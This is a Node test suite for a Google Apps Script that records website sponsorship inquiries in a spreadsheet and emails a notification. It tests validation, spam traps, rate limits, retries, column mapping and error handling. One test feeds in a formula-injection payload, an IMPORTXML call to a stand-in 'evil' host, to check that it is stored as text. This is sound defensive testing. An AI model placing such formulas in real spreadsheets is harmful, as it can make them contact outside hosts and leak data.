// Server-side tests for integrations/google-apps-script.gs.
// Runs the real script against simulated Apps Script services (Sheets, Mail,
// Cache, Properties, Lock). No dependencies:  node tests/apps-script.test.js
const {makeGas,makeSheet}=require('./gas-sim.js');
const fs=require('fs');
const ROOT=require('path').join(__dirname,'..')+'/';
let fails=0,passes=0; const ok=(c,m)=>{console.log((c?'PASS ':'FAIL ')+m); c?passes++:fails++;};
let n=0;
const base=(over={})=>Object.assign({submission_id:'sub_'+(++n)+'_abcdefgh',opportunity:'dedicated-banner',organization:'Test Plumbing Co',name:'Pat Lee',email:'pat'+n+'@example.com',phone:'801-555-0100',website:'example.com',budget:'$500 – $1,000',message:'Hello',consent:'yes',company_fax:'',elapsed_ms:'15000',booking_season:'2027',page:'https://wvfastpitch.org/sponsors/'},over);

// 1. server-side timestamp, server-derived label
{ const g=makeGas(ROOT); const t0=Date.now();
  const r=g.post(base({submitted_at:'1999-01-01T00:00:00Z',opportunity_label:'HACKED'}));
  const rec=g.records()[0];
  ok(r.ok===true && JSON.stringify(Object.keys(r))==='["ok"]','accepted; reply is just {"ok":true}');
  ok(rec.Submitted instanceof Date && Math.abs(rec.Submitted-t0)<5000,'Submitted is a server-generated Date (browser value ignored)');
  ok(rec['Interested in']==='Dedicated Field Banner — $750','label derived on server, browser label ignored');
  ok(g.mails.length===1 && g.mails[0].to==='sponsors@wvfastpitch.org','notification goes only to sponsors@wvfastpitch.org');
  ok(/^Sent /.test(rec['Email notification']),'row records email as Sent');
  ok(rec.Status==='New Inquiry' && rec['Submission ID'].startsWith('sub_'),'status New Inquiry + submission id stored');
}
// 2. honeypot & timing -> silent drop
{ const g=makeGas(ROOT);
  ok(g.post(base({company_fax:'555-1234'})).ok===true && g.records().length===0 && g.mails.length===0,'honeypot filled: fake ok, nothing stored or emailed');
  ok(g.post(base({elapsed_ms:'900'})).ok===true && g.records().length===0,'filled in under 2.5s: fake ok, nothing stored');
  const r=g.post(base({elapsed_ms:undefined})); ok(r.ok && g.records()[0].Flags.includes('No fill-time data'),'missing fill-time is accepted but flagged');
}
// 3. validation
{ const g=makeGas(ROOT);
  const v=(o,f,label)=>{const r=g.post(base(o)); ok(r.ok===false&&r.error==='invalid'&&r.fields.includes(f),label+' → invalid '+f);};
  v({email:'not-an-email'},'email','bad email');
  v({message:'x'.repeat(3001)},'message','3001-char message');
  v({organization:'A'.repeat(121)},'organization','121-char business name');
  v({opportunity:'free-stuff'},'opportunity','unknown opportunity');
  v({budget:'$1 million'},'budget','unknown budget');
  v({consent:''},'consent','no consent');
  v({submission_id:'x'},'submission_id','malformed submission id');
  v({season:'winter',opportunity:'jersey'},'season','unknown season');
  ok(g.records().length===0 && g.mails.length===0,'invalid submissions store nothing');
  const r=g.post(base({message:'see http://a.co http://b.co http://c.co http://d.co'}));
  ok(r.ok && g.records()[0].Flags.includes('Possible spam'),'link-heavy message accepted but flagged');
}
// 4. HTML budget options all accepted by server
{ const g=makeGas(ROOT); const html=fs.readFileSync(ROOT+'index.html','utf8');
  const sel=html.slice(html.indexOf('id="f-budget"'),html.indexOf('</select>',html.indexOf('id="f-budget"')));
  const opts=[...sel.matchAll(/<option(?: value="([^"]*)")?>([^<]*)<\/option>/g)].map(m=>m[1]!==undefined?m[1]:m[2]);
  const bad=opts.filter(o=>!g.post(base({budget:o})).ok);
  ok(opts.length===6 && bad.length===0,'every budget option on the website is accepted by the server ('+opts.length+')');
  const oppSel=html.slice(html.indexOf('id="f-opportunity"'),html.indexOf('</select>',html.indexOf('id="f-opportunity"')));
  const keys=[...oppSel.matchAll(/value="([^"]+)"/g)].map(m=>m[1]);
  const badK=keys.filter(k=>!g.post(base({opportunity:k,email:'k'+k+'@ex.com'})).ok);
  ok(keys.length===14 && badK.length===0,'every interest option on the website is accepted by the server ('+keys.length+')');
}
// 5. rate limits
{ const g=makeGas(ROOT);
  const same=()=>g.post(base({email:'same@example.com'}));
  const rs=[same(),same(),same(),same()];
  ok(rs.slice(0,3).every(r=>r.ok)&&rs[3].error==='rate_limited','4th inquiry from the same email within an hour is rate-limited');
  let last; for(let i=0;i<20;i++) last=g.post(base());
  ok(last.error==='rate_limited' && g.records().length===20,'overall 10-minute cap (20) enforced');
  ok(g.sheets['Integration Log'].grid.some(r=>/Rate limit reached/.test(r[2])),'rate-limit trips are logged');
  // daily cap
  const g2=makeGas(ROOT); const key=[...g2.props.keys()]; g2.post(base()); const dk=[...g2.props.keys()].find(k=>k.startsWith('count:'));
  g2.props.set(dk,'80'); ok(g2.post(base()).error==='rate_limited','daily cap (80) enforced');
}
// 6. idempotency
{ const g=makeGas(ROOT); const p=base();
  const a=g.post(p), b=g.post(p);
  ok(a.ok&&b.ok&&b.duplicate===true&&g.records().length===1&&g.mails.length===1,'retry with same submission id: one row, one email, still ok');
  g.cache.clear(); const c=g.post(p);
  ok(c.ok&&c.duplicate===true&&g.records().length===1,'retry after cache eviction is still caught via the Submission ID column');
}
// 7. email failures
{ const g=makeGas(ROOT,{mailFail:true}); const r=g.post(base());
  const rec=g.records()[0];
  ok(r.ok===true && rec,'email failure does not lose the inquiry (row written, visitor told ok)');
  ok(/^FAILED/.test(rec['Email notification']),'row shows FAILED email status: '+rec['Email notification'].slice(0,60));
  ok(g.sheets['Integration Log'].grid.some(r=>r[1]==='ERROR'&&/Notification email failed/.test(r[2])),'failure written to Integration Log');
  g.setMailFail(false); const res=g.ctx.retryFailedEmails();
  ok(g.mails.length===1 && /\(retry\)$/.test(g.records()[0]['Email notification']),'retryFailedEmails resends and updates the row ('+res+')');
  g.ctx.retryFailedEmails(); ok(g.mails.length===1,'retry does not resend already-sent emails');
  const g2=makeGas(ROOT,{quota:0}); g2.post(base());
  ok(/^Not sent — daily quota/.test(g2.records()[0]['Email notification']),'quota exhausted is recorded, not silently dropped');
}
// 8. column mapping into an existing tab, other tabs untouched
{ const g=makeGas(ROOT);
  const other=g.ctx.SpreadsheetApp.getActiveSpreadsheet().insertSheet('Prospects');
  other.grid.push(['Business','Owner'],['Acme','Teddi']); const otherBefore=JSON.stringify(other.grid);
  const inq=g.ctx.SpreadsheetApp.getActiveSpreadsheet().insertSheet('Website Inquiries');
  // owner reordered columns, added a custom one, and some of ours are missing
  inq.grid.push(['Email','Notes','Submitted','Business / organization','Status','Contact name'],['old@ex.com','keep me','2026-01-01','Old Co','Contacted','Old Name']);
  const r=g.post(base({email:'new@ex.com',organization:'New Co',name:'New Name'}));
  const h=inq.grid[0], row=inq.grid[2], at=k=>row[h.indexOf(k)];
  ok(r.ok && at('Email')==='new@ex.com' && at('Business / organization')==='New Co' && at('Contact name')==='New Name' && at('Status')==='New Inquiry','values land under the matching headers after reordering');
  ok(at('Notes')===''||at('Notes')===undefined,'custom column left empty');
  ok(JSON.stringify(inq.grid[1])===JSON.stringify(['old@ex.com','keep me','2026-01-01','Old Co','Contacted','Old Name']),'existing row untouched');
  ok(h.slice(0,6).join()==='Email,Notes,Submitted,Business / organization,Status,Contact name' && h.includes('Submission ID') && h.includes('Email notification'),'missing headers appended to the right, existing headers kept in place');
  ok(JSON.stringify(other.grid)===otherBefore,'other tabs in the tracker are not touched');
  ok(at('Submitted') instanceof Date,'Submitted written as a date in the reordered tab');
  // fresh tab layout matches HEADERS exactly
  const g2=makeGas(ROOT); g2.post(base());
  ok(g2.sheets['Website Inquiries'].grid[0].join('|')===g2.ctx.HEADERS.join('|') && g2.sheets['Website Inquiries'].frozen===1,'new tab gets the documented header row');
}
// 9. formula injection, phone kept as text
{ const g=makeGas(ROOT); g.post(base({message:'=IMPORTXML("http://evil")',organization:'+Plus Co',phone:'0801 555 0100'}));
  const rec=g.records()[0];
  ok(typeof rec.Message==='string' && rec.Message.startsWith('=IMPORTXML') && typeof rec['Business / organization']==='string','formula-like input stored as text, not a formula');
  const s=g.sheets['Website Inquiries']; const pc=s.grid[0].indexOf('Phone')+1; ok(s.formats['2:'+pc]==='@','phone column written as plain text (leading zeros kept)');
}
// 10. inventory stays internal and read-only
{ const g=makeGas(ROOT); g.ctx.setupInventory(); const inv=g.sheets['Inventory'];
  inv.grid.find(r=>r[0]==='jersey-spring')[5]=1; const before=JSON.stringify(inv.grid);
  const r=g.post(base({opportunity:'jersey',season:'spring'}));
  ok(r.ok && !JSON.stringify(r).match(/committed|remaining|availab/i),'reply to the browser contains no inventory information');
  ok(/Internal availability \(not shown on the website\): Spring Jersey Sponsorship \d{4}: fully committed/.test(g.mails[0].body),'owner email has the internal availability note');
  ok(JSON.stringify(inv.grid)===before,'Inventory tab unchanged');
  ok(g.records()[0]['Interested in']==='Jersey Sponsorship — from $2,500 (Spring)','fully committed placement still accepts the inquiry');
}
// 11. health check & error safety
{ const g=makeGas(ROOT); ok(JSON.parse(g.ctx.doGet()).service==='wvfp-sponsorship-inquiries','doGet health check');
  g.ctx.SpreadsheetApp.getActiveSpreadsheet=()=>{throw new Error('boom')};
  const r=JSON.parse(g.ctx.doPost({parameter:base()})); ok(r.ok===false&&r.error==='server','unexpected errors still return JSON {ok:false}, never an HTML error page');
}
console.log(`\nserver: ${passes} passed, ${fails} failed`); process.exit(fails?1:0);
